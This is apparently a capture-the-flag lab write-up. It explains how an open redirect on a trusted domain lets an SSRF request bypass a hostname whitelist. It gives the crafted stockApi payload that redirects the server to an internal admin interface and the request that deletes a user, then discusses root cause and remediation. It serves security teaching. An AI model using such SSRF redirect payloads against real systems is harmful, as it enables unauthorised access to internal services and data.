# SSRF with Filter Bypass via Open Redirection

## Lab Overview

This lab demonstrates how an open redirection vulnerability can be chained with a Server-Side Request Forgery (SSRF) vulnerability to bypass URL validation.

The application only allows requests to trusted domains. However, one of the trusted endpoints contains an open redirect, allowing an attacker to redirect the server to an internal resource.

**Difficulty:** Practitioner

**Category:** Server-Side Request Forgery (SSRF)

---

# Objective

Exploit an open redirection vulnerability to bypass the SSRF whitelist, access the internal administrator interface, and delete the user **carlos**.

---

# Vulnerability

The stock check functionality only accepts URLs from the trusted domain:

```
stock.weliketoshop.net
```

However, another endpoint on the same trusted domain contains an **open redirect**.

The server validates only the initial hostname and follows the redirect without verifying the final destination.

---

# Exploitation Steps

### 1. Intercept the stock check request

Capture the request using Burp Suite.

Example:

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 2. Identify an open redirect

The application contains a redirect endpoint similar to:

```
/product/nextProduct?path=
```

This endpoint redirects users to the value supplied in the **path** parameter.

---

### 3. Redirect the server to localhost

Modify the stockApi parameter to use the trusted redirect endpoint:

```
http://stock.weliketoshop.net/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Replace the IP address with the administrator interface discovered during the lab.

---

### 4. Delete Carlos

Access:

```
/admin/delete?username=carlos
```

The administrator endpoint is reached through the trusted redirect and the user is deleted.

---

# Root Cause

The application validates only the initial hostname before sending the request.

After validation, it automatically follows HTTP redirects without verifying the final destination.

An attacker abuses this behavior by redirecting the request to an internal resource.

---

# Security Impact

An attacker may:

- Bypass SSRF whitelist protections
- Access internal applications
- Reach administrative interfaces
- Scan internal networks
- Access cloud metadata services

---

# Remediation

- Disable automatic redirect following for user-controlled requests.
- Validate the final destination after every redirect.
- Allow outbound requests only to trusted hosts.
- Reject redirects to private IP ranges.
- Implement network-level outbound filtering.

---

# Key Takeaways

- Open redirects can become critical when chained with SSRF.
- Validating only the initial URL is insufficient.
- Every redirect destination must be revalidated.
- SSRF protection should verify the final request destination instead of only the original URL.

---

**Status:** ✅ Solved
